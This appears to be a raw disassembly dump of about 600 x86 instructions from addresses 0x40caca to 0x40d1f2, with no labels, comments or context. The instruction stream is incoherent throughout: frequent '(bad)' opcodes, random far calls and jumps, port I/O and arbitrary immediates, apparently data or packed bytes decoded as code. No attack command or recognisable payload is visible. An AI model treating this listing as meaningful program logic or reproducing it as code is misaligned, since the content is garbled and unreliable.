  40caca:	push   edx
  40cacb:	jmp    0x508ea400
  40cad0:	pop    ebp
  40cad1:	mov    WORD PTR [esi+0x3dbb061d],gs
  40cad7:	adc    esi,edx
  40cad9:	xor    dl,bl
  40cadb:	inc    edi
  40cadc:	imul   edx,DWORD PTR [edi-0x66f13521],0x1d
  40cae3:	hlt    
  40cae4:	mov    al,ds:0x42d2b9c7
  40cae9:	adc    BYTE PTR [eax-0x54],0xa0
  40caed:	scas   al,BYTE PTR es:[edi]
  40caee:	push   0xa3a550f0
  40caf3:	test   DWORD PTR [esi],0x25d122b7
  40caf9:	cmp    dh,al
  40cafb:	push   es
  40cafc:	inc    esp
  40cafd:	test   BYTE PTR gs:[eax+0x3],ch
  40cb01:	xor    eax,0xaa4ea817
  40cb06:	sub    edx,DWORD PTR [edi+edx*4+0x10]
  40cb0a:	mov    DWORD PTR [eax+0x693c8eeb],0xba875418
  40cb14:	adc    al,BYTE PTR [eax-0x197e7f4c]
  40cb1a:	or     ah,bh
  40cb1c:	in     al,dx
  40cb1d:	clc    
  40cb1e:	cmp    DWORD PTR [edi+0x2d],0x21782c83
  40cb25:	mov    cl,0xf1
  40cb27:	sahf   
  40cb28:	out    0xe2,al
  40cb2a:	int    0x43
  40cb2c:	push   0xfffffff7
  40cb2e:	es scas eax,DWORD PTR es:[edi]
  40cb30:	dec    ebx
  40cb31:	imul   esi,DWORD PTR [esi+0x6bf7bc89],0x4b
  40cb38:	lock mov edi,0xcc0d9f8c
  40cb3e:	test   DWORD PTR [ebx+0x33],eax
  40cb41:	dec    esi
  40cb42:	jae    0x40cb99
  40cb44:	mov    ecx,0x770b1b50
  40cb4a:	int    0x26
  40cb4c:	jo     0x40cb50
  40cb4e:	dec    ebx
  40cb4f:	fistp  DWORD PTR [edi]
  40cb51:	xor    BYTE PTR [edx],dh
  40cb53:	imul   ecx,edi,0x9a62a24c
  40cb59:	inc    ebx
  40cb5a:	push   edi
  40cb5b:	and    eax,0x298ac3d3
  40cb60:	into   
  40cb61:	mov    ch,0xb7
  40cb63:	loop   0x40cb26
  40cb65:	test   BYTE PTR [ebp+0x63],0xe5
  40cb69:	mov    gs,WORD PTR ds:0x563f0d8e
  40cb6f:	or     al,0xfe
  40cb71:	test   eax,0xc1a8948c
  40cb76:	sbb    al,0xce
  40cb78:	or     eax,0x658d678a
  40cb7d:	pop    edi
  40cb7e:	mov    eax,ds:0x81a3fd3e
  40cb83:	jle    0x40cb8f
  40cb85:	retf   
  40cb86:	in     al,dx
  40cb87:	frstor ds:0xcbde4c7a
  40cb8d:	xchg   esp,eax
  40cb8e:	or     ah,BYTE PTR ds:0x8865a45f
  40cb94:	xor    eax,0xeaec608e
  40cb99:	or     DWORD PTR [ecx+0x1d],0xfffffff5
  40cb9d:	inc    edi
  40cb9e:	add    eax,0x534eed2e
  40cba3:	lods   eax,DWORD PTR ds:[esi]
  40cba4:	push   edi
  40cba5:	adc    al,0x5f
  40cba7:	or     al,0x1d
  40cba9:	loop   0x40cbfc
  40cbab:	dec    ecx
  40cbac:	pop    esp
  40cbad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbae:	xor    DWORD PTR [edi-0x40f4a073],0x2f0883a0
  40cbb8:	loop   0x40cc19
  40cbba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbbb:	pop    esp
  40cbbc:	pop    edx
  40cbbd:	push   esp
  40cbbe:	(bad)  
  40cbbf:	cmp    eax,0x4a9f8c0a
  40cbc4:	aam    0xe5
  40cbc6:	pop    esp
  40cbc7:	jp     0x40cbb9
  40cbc9:	(bad)  
  40cbca:	push   esp
  40cbcb:	stc    
  40cbcc:	xor    eax,0x1ca9d09
  40cbd1:	std    
  40cbd2:	scas   eax,DWORD PTR es:[edi]
  40cbd3:	and    al,0xc9
  40cbd5:	mov    ds:0xa7249042,eax
  40cbda:	cld    
  40cbdb:	fldenv [edi-0x3060f71e]
  40cbe1:	sbb    al,0x94
  40cbe3:	adc    eax,0x2b586f7c
  40cbe8:	lds    eax,FWORD PTR [ebx+0x11c4b368]
  40cbee:	repz imul esi,esp,0x84c69f7f
  40cbf5:	in     eax,dx
  40cbf6:	fist   WORD PTR [ecx-0x23]
  40cbf9:	into   
  40cbfa:	cmp    ah,0xa8
  40cbfd:	dec    esi
  40cbfe:	xlat   BYTE PTR ds:[ebx]
  40cbff:	push   ds
  40cc00:	mov    cl,0xf6
  40cc02:	cmp    DWORD PTR [edx],ecx
  40cc04:	inc    ecx
  40cc05:	cmc    
  40cc06:	mov    ah,BYTE PTR [esi+0x7f]
  40cc09:	retf   0xcc6e
  40cc0c:	and    eax,DWORD PTR [esi+0x15ef4a2d]
  40cc12:	ret    
  40cc13:	fcom   DWORD PTR [edx]
  40cc15:	cmp    ecx,ebx
  40cc17:	sub    al,0xe6
  40cc19:	nop
  40cc1a:	sbb    DWORD PTR [edx-0x44],0xfecffcc5
  40cc21:	pop    esi
  40cc22:	(bad)  
  40cc23:	repz jecxz 0x40cc51
  40cc26:	jl     0x40cc08
  40cc28:	xor    DWORD PTR [ecx+0x7],ebx
  40cc2b:	ror    BYTE PTR [esp+ebx*2],1
  40cc2e:	ja     0x40cc53
  40cc30:	dec    esp
  40cc31:	sub    ch,BYTE PTR [edi+0x5a238dba]
  40cc37:	push   0xdc779916
  40cc3c:	inc    edx
  40cc3d:	popf   
  40cc3e:	push   esp
  40cc3f:	or     cl,BYTE PTR [ecx-0x31]
  40cc42:	idiv   DWORD PTR [edx-0x2a5e01f4]
  40cc48:	sbb    ah,BYTE PTR [ecx+eax*4+0x6a]
  40cc4c:	cmp    ch,0x8
  40cc4f:	fisubr WORD PTR gs:[ecx+0xab5cddf]
  40cc56:	fidivr DWORD PTR [esi]
  40cc58:	cmp    eax,0x35ca4208
  40cc5d:	cld    
  40cc5e:	inc    ecx
  40cc5f:	neg    BYTE PTR [esi-0x27]
  40cc62:	cwd    
  40cc64:	push   esi
  40cc65:	pop    esi
  40cc66:	dec    ecx
  40cc67:	cmc    
  40cc68:	(bad)  
  40cc69:	mov    ebx,0x55d2c768
  40cc6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc6f:	jo     0x40cc35
  40cc71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc72:	jmp    0x39f6:0x8d31747c
  40cc79:	daa    
  40cc7a:	out    0xce,eax
  40cc7c:	adc    al,0x8
  40cc7e:	in     al,dx
  40cc7f:	sahf   
  40cc80:	fdiv   QWORD PTR [eax+0x1e]
  40cc83:	fistp  QWORD PTR [edx+0x139964b]
  40cc89:	mov    ds:0x5e927d3e,eax
  40cc8e:	imul   ecx,DWORD PTR [esi-0x496ea99c],0xcb412a82
  40cc98:	dec    edi
  40cc99:	and    al,0x77
  40cc9b:	(bad)  
  40cc9c:	sbb    ah,dh
  40cc9e:	aaa    
  40cc9f:	loop   0x40ccfb
  40cca1:	(bad)
  40cca4:	sub    BYTE PTR [ebp+ecx*2+0x1076e4e9],dl
  40ccab:	sub    al,0x7a
  40ccad:	aaa    
  40ccae:	pop    edx
  40ccaf:	mov    ah,0x62
  40ccb2:	data16 jno 0x40ccee
  40ccb5:	fwait
  40ccb6:	iret   
  40ccb7:	fwait
  40ccb8:	xor    BYTE PTR [edi],dl
  40ccba:	xchg   edx,eax
  40ccbb:	xchg   ebx,eax
  40ccbc:	jecxz  0x40cc47
  40ccbe:	ja     0x40cd34
  40ccc0:	rcl    BYTE PTR [edx+0x2c5c000b],0xa7
  40ccc7:	add    BYTE PTR [edx+edi*1-0x73],0x30
  40cccc:	pop    edx
  40cccd:	xor    al,0x69
  40cccf:	add    DWORD PTR [edi],esi
  40ccd1:	push   es
  40ccd2:	pop    es
  40ccd3:	xchg   DWORD PTR [ecx],esp
  40ccd5:	loopne 0x40cc96
  40ccd7:	inc    edi
  40ccd8:	inc    eax
  40ccd9:	adc    dh,BYTE PTR [eax+0x57]
  40ccdc:	push   eax
  40ccdd:	and    BYTE PTR [ebp+edi*2-0xf],ah
  40cce1:	(bad)  
  40cce2:	retf   0xaab
  40cce5:	mov    eax,ds:0x60602a21
  40ccea:	sbb    edi,eax
  40ccec:	sub    ebp,DWORD PTR [edx+0x66]
  40ccef:	push   ss
  40ccf0:	stc    
  40ccf1:	adc    ah,BYTE PTR [eax+ebx*2-0x3]
  40ccf5:	das    
  40ccf6:	scas   al,BYTE PTR es:[edi]
  40ccf7:	cmc    
  40ccf8:	mov    ?,WORD PTR cs:[ebx+ecx*2]
  40ccfc:	bound  ebp,QWORD PTR [esi+0x5c]
  40ccff:	int    0xdd
  40cd01:	in     al,0x74
  40cd03:	xchg   edx,eax
  40cd04:	mov    bh,0xdb
  40cd06:	dec    esp
  40cd07:	add    eax,0xb0b4043b
  40cd0c:	push   ecx
  40cd0d:	jmp    0x3cdabb0
  40cd12:	outs   dx,BYTE PTR ds:[esi]
  40cd13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd14:	xchg   ecx,eax
  40cd15:	xor    esp,DWORD PTR ds:0x8821a4b2
  40cd1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd1c:	cmp    ch,BYTE PTR [esi-0x64]
  40cd1f:	stos   DWORD PTR es:[edi],eax
  40cd20:	pop    ecx
  40cd21:	pop    ebp
  40cd22:	pop    esi
  40cd23:	jbe    0x40ccd2
  40cd25:	push   ebp
  40cd26:	xor    dh,BYTE PTR [edi+0x77]
  40cd29:	cdq    
  40cd2a:	out    dx,eax
  40cd2b:	aas    
  40cd2c:	inc    edx
  40cd2d:	sub    al,0xae
  40cd2f:	cs xor eax,esi
  40cd32:	cmp    ah,BYTE PTR [edx+0x76]
  40cd35:	and    BYTE PTR [eax+edi*8+0x27642b81],dl
  40cd3c:	ins    DWORD PTR es:[edi],dx
  40cd3d:	jl     0x40cd74
  40cd3f:	xchg   esi,eax
  40cd40:	adc    ecx,edi
  40cd42:	dec    edx
  40cd43:	loope  0x40cdbc
  40cd45:	sbb    eax,DWORD PTR [ecx+0x16]
  40cd48:	lods   eax,DWORD PTR ds:[esi]
  40cd49:	fcom   QWORD PTR [esi]
  40cd4b:	adc    esi,DWORD PTR [edi+0x4]
  40cd4e:	jp     0x40cda5
  40cd50:	aaa    
  40cd51:	sbb    ah,BYTE PTR [ebp-0x3893e7c2]
  40cd57:	push   ebx
  40cd58:	mov    ds:0x2a506248,eax
  40cd5d:	dec    edi
  40cd5e:	stc    
  40cd5f:	ds (bad) 
  40cd62:	xchg   ebp,eax
  40cd63:	mov    eax,ds:0xa9e5296f
  40cd68:	sbb    cl,BYTE PTR [ebx]
  40cd6a:	fild   WORD PTR [ebx-0x57]
  40cd6d:	loopne 0x40cd23
  40cd6f:	cmp    eax,0x36d5dbb8
  40cd74:	inc    esi
  40cd75:	mov    DWORD PTR [edx+esi*2-0x13867e3c],edx
  40cd7c:	jle    0x40cd0f
  40cd7e:	jecxz  0x40cd51
  40cd80:	and    ebp,DWORD PTR [eax]
  40cd82:	push   ecx
  40cd83:	jl     0x40cdba
  40cd85:	sbb    DWORD PTR [edx+ebx*8],edi
  40cd88:	std    
  40cd89:	mov    WORD PTR [ebx-0x53],fs
  40cd8c:	(bad)  
  40cd8d:	ja     0x40cd96
  40cd8f:	jmp    0x40cdb1
  40cd91:	sub    eax,eax
  40cd93:	xchg   ebp,eax
  40cd94:	sbb    BYTE PTR [ecx],dh
  40cd96:	lds    ebp,FWORD PTR [edx-0x1f]
  40cd99:	dec    esi
  40cd9a:	leave  
  40cd9b:	mov    bl,0x8c
  40cd9d:	mov    edx,0xa1556322
  40cda2:	dec    edi
  40cda3:	inc    esp
  40cda4:	cwde   
  40cda5:	sub    al,0x72
  40cda7:	dec    ecx
  40cda8:	test   al,0x1
  40cdaa:	pop    ds
  40cdab:	shr    DWORD PTR [edi-0x6a4cdd5a],cl
  40cdb1:	sbb    esi,DWORD PTR [ecx-0x5d]
  40cdb4:	pop    ecx
  40cdb5:	(bad)  
  40cdb6:	sub    ah,BYTE PTR [edx+0x5f]
  40cdb9:	in     al,dx
  40cdba:	aam    0xfc
  40cdbc:	mul    edx
  40cdbe:	int    0x46
  40cdc0:	jne    0x40ce0b
  40cdc2:	aad    0x1d
  40cdc4:	pop    edi
  40cdc5:	outs   dx,DWORD PTR ds:[esi]
  40cdc6:	add    bl,ah
  40cdc8:	sub    DWORD PTR [ecx+ecx*1-0x70],esp
  40cdcc:	in     al,dx
  40cdcd:	out    dx,eax
  40cdce:	retf   
  40cdcf:	add    eax,0xda26c7ce
  40cdd4:	test   ch,0x44
  40cdd7:	sahf   
  40cdd8:	(bad)  
  40cdd9:	cmp    al,0x23
  40cddb:	and    esi,DWORD PTR [ebx+edx*2-0x4e1a92fa]
  40cde2:	add    DWORD PTR [ebp+0x67],ecx
  40cde5:	inc    edx
  40cde6:	les    esp,FWORD PTR [ebp-0x3c99eee9]
  40cdec:	iret   
  40cded:	mov    ch,0x15
  40cdef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdf0:	jno    0x40cdd6
  40cdf2:	clc    
  40cdf3:	(bad)  
  40cdf4:	ficomp WORD PTR [esi-0x51]
  40cdf7:	aam    0x1b
  40cdf9:	mov    eax,0x36c92673
  40cdfe:	push   ebx
  40cdff:	out    dx,eax
  40ce00:	mov    ebx,0x643d6063
  40ce05:	push   esi
  40ce06:	stos   BYTE PTR es:[edi],al
  40ce07:	add    DWORD PTR [ecx-0xe],edi
  40ce0a:	push   edi
  40ce0b:	rcl    DWORD PTR [esi-0x1],1
  40ce0e:	mov    edi,0x7bc5fa8
  40ce13:	sub    edx,DWORD PTR [eax-0x73b8c4b1]
  40ce19:	mov    WORD PTR [eax+0x0],ss
  40ce1c:	xchg   edx,eax
  40ce1d:	adc    al,0xdf
  40ce1f:	call   0xace6bd23
  40ce24:	add    esi,eax
  40ce26:	test   eax,0x9c9f2b7d
  40ce2b:	ss mov ebx,0xcfb37a02
  40ce31:	(bad)  
  40ce33:	mov    al,ds:0x8823dba2
  40ce38:	add    esp,DWORD PTR [eax]
  40ce3a:	hlt    
  40ce3b:	pop    edx
  40ce3c:	dec    ebp
  40ce3d:	gs mov dl,0xf8
  40ce40:	mov    esi,ecx
  40ce42:	in     eax,0xdc
  40ce44:	jbe    0x40cea4
  40ce46:	mov    ds:0xb6e98939,eax
  40ce4b:	nop
  40ce4c:	lods   al,BYTE PTR ds:[esi]
  40ce4d:	xchg   ecx,eax
  40ce4e:	adc    DWORD PTR [edx+0x57977c85],ebx
  40ce54:	ins    BYTE PTR es:[edi],dx
  40ce55:	pop    es
  40ce56:	sub    al,cl
  40ce58:	ins    BYTE PTR es:[edi],dx
  40ce59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce5a:	push   edx
  40ce5b:	mov    eax,0xe4d128a7
  40ce60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce61:	rol    DWORD PTR ds:[esi-0x13],0xe
  40ce66:	mov    bl,0x1c
  40ce68:	stos   BYTE PTR es:[edi],al
  40ce69:	mov    ebx,DWORD PTR [ecx]
  40ce6b:	cmp    DWORD PTR [edi+ebx*1],0xc78f5e46
  40ce72:	sub    eax,0xc3657915
  40ce77:	add    bl,BYTE PTR [eax]
  40ce79:	into   
  40ce7a:	pop    ds
  40ce7b:	sub    eax,0x4b02234
  40ce80:	sub    eax,0x1be2ebfc
  40ce85:	int    0x1f
  40ce87:	in     al,dx
  40ce88:	repz jle 0x40cea4
  40ce8b:	or     eax,edx
  40ce8d:	leave  
  40ce8e:	xchg   ebx,eax
  40ce8f:	xchg   ecx,eax
  40ce90:	cli    
  40ce91:	sub    al,0x10
  40ce93:	xor    ah,BYTE PTR [esi]
  40ce95:	arpl   di,cx
  40ce97:	dec    eax
  40ce98:	les    edi,FWORD PTR [edx+0x20]
  40ce9b:	js     0x40ce96
  40ce9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce9e:	aas    
  40ce9f:	fsubr  st(4),st
  40cea1:	mov    ah,cl
  40cea3:	ror    DWORD PTR fs:[edi-0x63],0x30
  40cea8:	fild   WORD PTR [edx-0xb]
  40ceab:	jns    0x40cecd
  40cead:	mov    eax,0xbe8e560d
  40ceb2:	fnstsw WORD PTR cs:[edx]
  40ceb5:	test   BYTE PTR [edi-0x3],0xec
  40ceb9:	pusha  
  40ceba:	or     eax,0x5228aed5
  40cebf:	sbb    al,0xe9
  40cec1:	fistp  QWORD PTR [ebx-0x6b60f972]
  40cec7:	mov    esp,0xb4998e
  40cecc:	jb     0x40cf38
  40cece:	inc    ebp
  40cecf:	jle    0x40ceea
  40ced1:	ds pop ebp
  40ced3:	and    dl,bh
  40ced5:	pop    ecx
  40ced6:	int3   
  40ced7:	mov    ch,BYTE PTR [eax+ecx*2+0x79]
  40cedb:	inc    BYTE PTR [eax]
  40cedd:	xchg   edi,ebx
  40cedf:	aaa    
  40cee0:	push   ebp
  40cee1:	test   BYTE PTR [esi-0x4a],ah
  40cee4:	loope  0x40ce9c
  40cee6:	call   0xce66:0xa175e931
  40ceed:	push   edi
  40ceee:	mov    ds:0x15e69d5,eax
  40cef3:	pop    ebp
  40cef4:	jno    0x40ceef
  40cef6:	(bad)  
  40cef7:	aad    0x51
  40cef9:	mov    ah,0x8b
  40cefb:	and    DWORD PTR [esi-0x6ba31605],esi
  40cf01:	and    eax,0xed05cb60
  40cf06:	push   eax
  40cf07:	and    DWORD PTR [ebx+0x2a],ecx
  40cf0a:	xchg   DWORD PTR [edi+edx*1+0x69],ecx
  40cf0e:	mov    BYTE PTR [edi+0x35976954],bl
  40cf14:	popf   
  40cf15:	push   es
  40cf16:	popf   
  40cf17:	sahf   
  40cf18:	mov    al,ds:0xf34818c
  40cf1d:	ficomp WORD PTR [ebx+0x38]
  40cf20:	ss sahf 
  40cf22:	pop    edx
  40cf23:	fst    DWORD PTR [ebx-0x74]
  40cf26:	repnz xchg esi,edi
  40cf29:	jbe    0x40cf3b
  40cf2b:	les    edi,FWORD PTR [edx-0x4202ef3c]
  40cf31:	xor    DWORD PTR [edx+0x2b],esi
  40cf34:	(bad)  
  40cf35:	leave  
  40cf36:	inc    esp
  40cf37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf38:	inc    esi
  40cf39:	push   esp
  40cf3a:	and    eax,DWORD PTR [eax-0x6f]
  40cf3d:	inc    ebp
  40cf3e:	out    0xb2,al
  40cf40:	mov    es,esi
  40cf42:	push   ss
  40cf43:	xchg   ecx,eax
  40cf44:	mov    edi,0x813128d6
  40cf49:	push   cs
  40cf4a:	pop    ebp
  40cf4b:	jns    0x40cf28
  40cf4d:	pop    ecx
  40cf4e:	je     0x40cfa1
  40cf50:	cwde   
  40cf51:	push   es
  40cf52:	inc    ecx
  40cf53:	imul   ebx,DWORD PTR [eax],0xffffff9f
  40cf56:	pushf  
  40cf57:	xchg   esi,eax
  40cf58:	and    BYTE PTR [esi],0x81
  40cf5b:	mov    dh,0x40
  40cf5d:	cmp    BYTE PTR [eax-0x607efab9],cl
  40cf63:	fwait
  40cf64:	pop    esp
  40cf65:	nop
  40cf66:	mov    dl,0x25
  40cf68:	jae    0x40cfd7
  40cf6a:	int    0x5e
  40cf6c:	fiadd  WORD PTR [ebx+eax*1-0x3d]
  40cf70:	dec    edi
  40cf71:	sti    
  40cf72:	popf   
  40cf73:	(bad)  
  40cf74:	retf   0x5754
  40cf77:	loopne 0x40cf32
  40cf79:	sti    
  40cf7a:	bound  edi,QWORD PTR [ebx]
  40cf7c:	repz jne 0x40cfe2
  40cf7f:	xchg   edi,eax
  40cf80:	and    DWORD PTR [ebp+edx*1+0x6c286348],0x576c2b33
  40cf8b:	pop    es
  40cf8c:	or     al,0x8a
  40cf8e:	xchg   edx,eax
  40cf8f:	add    al,0x7f
  40cf91:	repz inc edx
  40cf93:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40cf95:	xor    BYTE PTR [eax],ch
  40cf97:	mov    ebp,0x962d7225
  40cf9c:	pop    eax
  40cf9d:	mov    cl,0x42
  40cf9f:	dec    esp
  40cfa0:	dec    edx
  40cfa1:	pusha  
  40cfa2:	jae    0x40cf32
  40cfa4:	ret    0x4f17
  40cfa7:	aad    0xff
  40cfa9:	push   ds
  40cfaa:	ins    BYTE PTR es:[edi],dx
  40cfab:	pop    ss
  40cfac:	lds    edx,FWORD PTR [edx+0x15f8f4fe]
  40cfb2:	fild   QWORD PTR ds:0x2fd8a1d3
  40cfb8:	add    al,0x6d
  40cfba:	int    0x99
  40cfbc:	lahf   
  40cfbd:	call   0x337b7a16
  40cfc2:	jp     0x40cf8d
  40cfc4:	jo     0x40cf7d
  40cfc6:	in     eax,dx
  40cfc7:	mov    ch,BYTE PTR ds:0xfdd9488f
  40cfcd:	jmp    0x40cfaf
  40cfcf:	pop    ecx
  40cfd0:	adc    ebp,ebx
  40cfd2:	or     edi,eax
  40cfd4:	fnstcw WORD PTR [ebx-0x5d36d801]
  40cfda:	outs   dx,DWORD PTR ds:[esi]
  40cfdb:	inc    ebp
  40cfdc:	mov    dl,0x4c
  40cfde:	jb     0x40d044
  40cfe0:	sbb    eax,0x2693b8f5
  40cfe5:	jbe    0x40d026
  40cfe7:	out    0xf8,eax
  40cfe9:	inc    edx
  40cfea:	xchg   ebp,eax
  40cfeb:	mov    ebx,0xe661156
  40cff0:	push   eax
  40cff1:	sub    DWORD PTR [edx+0x50ca9482],esp
  40cff7:	jg     0x40d059
  40cff9:	aam    0x1
  40cffb:	sbb    eax,0x311a2ebe
  40d000:	cli    
  40d001:	ret    
  40d002:	inc    ebp
  40d003:	xor    bl,BYTE PTR [edi]
  40d005:	std    
  40d006:	sub    BYTE PTR [edi],ch
  40d008:	data16 out 0x25,al
  40d00b:	inc    ecx
  40d00c:	mov    DWORD PTR [edx],edx
  40d00e:	sub    eax,DWORD PTR [edx-0x13]
  40d011:	push   edi
  40d012:	dec    BYTE PTR [eax-0x49]
  40d015:	push   ebx
  40d016:	mov    ch,0x32
  40d018:	push   ds
  40d019:	xchg   esi,eax
  40d01a:	jge    0x40d008
  40d01c:	xchg   esi,eax
  40d01d:	push   ecx
  40d01e:	sub    eax,ebp
  40d020:	adc    BYTE PTR [edx],ah
  40d022:	push   edi
  40d023:	imul   ecx,DWORD PTR [ebx+eax*2],0xffffff89
  40d027:	fsubr  st(3),st
  40d029:	lods   al,BYTE PTR ds:[esi]
  40d02a:	hlt    
  40d02b:	loop   0x40d086
  40d02d:	xlat   BYTE PTR ds:[ebx]
  40d02e:	fwait
  40d02f:	repz adc al,ch
  40d032:	scas   eax,DWORD PTR es:[edi]
  40d033:	jl     0x40d066
  40d035:	jnp    0x40d08f
  40d037:	stc    
  40d038:	jmp    esp
  40d03a:	sub    al,0xa6
  40d03c:	push   ecx
  40d03d:	mov    cl,0x1d
  40d03f:	loop   0x40d05f
  40d041:	pop    ss
  40d042:	sub    BYTE PTR [ecx-0x65],0x1f
  40d046:	cmp    DWORD PTR [edi-0x5891315d],esi
  40d04c:	rcl    DWORD PTR [ecx-0x1c],cl
  40d04f:	push   edx
  40d050:	lea    esp,[esi]
  40d052:	cli    
  40d053:	sbb    ebx,DWORD PTR [edi]
  40d055:	mov    al,ds:0xe73ed59d
  40d05a:	je     0x40d044
  40d05c:	dec    esi
  40d05d:	and    BYTE PTR [ebx+ebx*1],dh
  40d060:	jno    0x40d011
  40d062:	lea    eax,[ebx]
  40d064:	xchg   esp,eax
  40d065:	inc    edx
  40d066:	adc    BYTE PTR [esi],dh
  40d068:	gs and al,0xef
  40d06b:	inc    edi
  40d06c:	out    dx,eax
  40d06d:	into   
  40d06e:	outs   dx,BYTE PTR ds:[esi]
  40d06f:	inc    edi
  40d070:	push   cs
  40d071:	repz sbb BYTE PTR [ebp+eiz*2+0x52b656f1],0x48
  40d07a:	xchg   dl,ah
  40d07c:	test   al,0x46
  40d07e:	add    cl,cl
  40d080:	jb     0x40d0d6
  40d082:	leave  
  40d083:	pop    ss
  40d084:	dec    ebp
  40d085:	jnp    0x40d008
  40d087:	mov    ch,al
  40d089:	int3   
  40d08a:	mov    esi,?
  40d08c:	cmp    eax,0x12707cf
  40d091:	lods   eax,DWORD PTR ds:[esi]
  40d092:	out    dx,eax
  40d093:	inc    ecx
  40d094:	mov    eax,0x2b27caee
  40d099:	inc    ebx
  40d09a:	test   BYTE PTR [edi+0x24866ebf],0x91
  40d0a1:	dec    ebp
  40d0a2:	icebp  
  40d0a3:	mov    edi,0x585a30e5
  40d0a8:	imul   esp,DWORD PTR [edx],0x113f4e14
  40d0ae:	test   BYTE PTR [ebx],ah
  40d0b0:	(bad)  
  40d0b1:	add    eax,0x2b3b9451
  40d0b6:	jg     0x40d0ef
  40d0b8:	sbb    eax,DWORD PTR [edx]
  40d0ba:	xor    ch,dl
  40d0bc:	xor    ch,ch
  40d0be:	call   0x44825c4b
  40d0c3:	sbb    bl,BYTE PTR [edi+0x1f]
  40d0c6:	(bad)  
  40d0c7:	pop    edx
  40d0c8:	mov    ebp,0xdb2d92e0
  40d0cd:	dec    ecx
  40d0ce:	icebp  
  40d0cf:	mov    eax,0x56d44060
  40d0d4:	pop    ecx
  40d0d5:	outs   dx,DWORD PTR ds:[esi]
  40d0d6:	fidivr DWORD PTR [eax]
  40d0d8:	js     0x40d065
  40d0da:	(bad)  
  40d0db:	mov    edx,0x3b8d1ffd
  40d0e0:	call   0xf122:0x6c776811
  40d0e7:	cs jp  0x40d07f
  40d0ea:	pusha  
  40d0eb:	lods   al,BYTE PTR ds:[esi]
  40d0ec:	jge    0x40d091
  40d0ee:	jmp    0x70f8e0fd
  40d0f3:	and    dh,BYTE PTR [eax]
  40d0f5:	sub    eax,0xa1b081e6
  40d0fa:	ss xor edi,edx
  40d0fd:	ret    0xf2d
  40d100:	sbb    cl,ah
  40d102:	popf   
  40d103:	add    DWORD PTR [edx],edx
  40d105:	cwde   
  40d106:	sub    al,0xcf
  40d108:	scas   eax,DWORD PTR es:[edi]
  40d109:	in     al,dx
  40d10a:	or     BYTE PTR [ecx],ch
  40d10c:	adc    esi,eax
  40d10e:	outs   dx,DWORD PTR ds:[esi]
  40d10f:	sub    BYTE PTR [eax],ch
  40d111:	inc    eax
  40d112:	xor    eax,0x3478fd1
  40d117:	adc    al,0x85
  40d119:	jo     0x40d0c9
  40d11b:	dec    ebx
  40d11c:	push   ebx
  40d11d:	test   al,0xa
  40d11f:	xor    ebx,ebx
  40d121:	sub    ah,BYTE PTR [eax+0x49]
  40d124:	loopne 0x40d0da
  40d126:	in     al,dx
  40d127:	push   ecx
  40d128:	push   cs
  40d129:	jne    0x40d1a0
  40d12b:	dec    esi
  40d12c:	icebp  
  40d12d:	sbb    bh,bl
  40d12f:	fisub  WORD PTR [esi-0x76c5ee78]
  40d135:	stc    
  40d136:	inc    esi
  40d137:	push   cs
  40d138:	imul   edx,DWORD PTR [edi+0x33],0x19
  40d13c:	lods   al,BYTE PTR ds:[esi]
  40d13d:	sub    eax,0xd437e0e4
  40d142:	mov    eax,ds:0xe5bb0b25
  40d147:	mov    eax,0x6b7e5ea1
  40d14c:	pop    edx
  40d14d:	push   eax
  40d14e:	(bad)  
  40d14f:	jge    0x40d1cb
  40d151:	or     eax,0x8b20bf00
  40d156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d157:	cmp    eax,0x5c28b826
  40d15c:	mov    ds:0xcf01083d,al
  40d161:	sub    al,BYTE PTR [edx]
  40d163:	jo     0x40d17a
  40d165:	mov    edi,0x75bf3f81
  40d16a:	sbb    eax,esi
  40d16c:	mov    ecx,0x92a64405
  40d171:	mov    ebx,0x61cc9b13
  40d176:	cmp    al,BYTE PTR [esi]
  40d178:	adc    eax,0x12da4819
  40d17d:	mov    eax,0x5df08439
  40d182:	loope  0x40d1e7
  40d184:	not    DWORD PTR [eax+ebx*4]
  40d187:	add    al,ah
  40d189:	fidiv  WORD PTR [ebp-0x77]
  40d18c:	inc    eax
  40d18d:	in     eax,dx
  40d18e:	and    eax,0x3a654a88
  40d193:	jb     0x40d17a
  40d195:	call   0x2b3f:0xcd2a89bd
  40d19c:	add    BYTE PTR [edi+0x40],dh
  40d19f:	popf   
  40d1a0:	mov    al,0xeb
  40d1a2:	(bad)  [eax-0x1f203724]
  40d1a8:	mov    esi,0x8e4eb720
  40d1ad:	jecxz  0x40d158
  40d1af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1b0:	and    DWORD PTR [edi+edx*8],ebp
  40d1b3:	xchg   ecx,eax
  40d1b4:	push   ss
  40d1b5:	fs (bad) 
  40d1b7:	jp     0x40d1f3
  40d1b9:	dec    esp
  40d1ba:	popf   
  40d1bb:	push   eax
  40d1bd:	dec    esp
  40d1be:	mov    cl,0x64
  40d1c0:	inc    ecx
  40d1c1:	outs   dx,BYTE PTR ds:[esi]
  40d1c2:	pop    ebp
  40d1c3:	xchg   ecx,eax
  40d1c4:	push   0xe6804738
  40d1c9:	idiv   BYTE PTR [ecx-0x62542bae]
  40d1cf:	call   FWORD PTR [ebp+0x34]
  40d1d2:	pop    eax
  40d1d3:	stos   DWORD PTR es:[edi],eax
  40d1d4:	sbb    bl,al
  40d1d6:	mov    ds:0x3479730f,eax
  40d1db:	cwde   
  40d1dc:	pop    bx
  40d1de:	rol    BYTE PTR [ecx],cl
  40d1e0:	push   cs
  40d1e1:	fwait
  40d1e2:	imul   ebp,DWORD PTR [ebx],0x7b
  40d1e5:	mov    eax,0xe602b7fb
  40d1ea:	push   cs
  40d1eb:	cmp    al,BYTE PTR [edi-0x7f1b5e53]
  40d1f1:	int3   
  40d1f2:	pop    ecx
